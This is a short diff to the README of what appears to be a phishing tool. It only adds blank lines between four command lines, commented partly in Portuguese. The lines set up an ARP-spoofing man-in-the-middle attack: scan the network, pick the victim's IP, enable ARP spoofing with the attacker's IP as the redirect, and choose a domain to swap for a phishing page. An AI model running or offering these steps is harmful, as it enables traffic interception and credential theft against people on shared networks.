@@ -16,6 +16,10 @@ https://github.com/0ruguri0/phispytool/assets/150361492/dd29becd-55dd-4c15-a5b8-
 
 
 NET.RECON ON/OFF 	                                    // Initialize Network Scan to mark machine in "use", Attacker and Victim machine
+
 NEW.SHOW + set arp.spoof.targets (Ip da Vitima) 	    // View machines, and define the victim's machine
+
 ARP.SPOOF ON + set dns.spoof.adress (Ip do Atacante) 	// Enable Spoof and set Spoof Redirection IP
+
 set dns.spoof.domains (Dominio Desejado para Trocar) 	// Set DOMAIN (EXCHANGE FOR PHISHING)
+
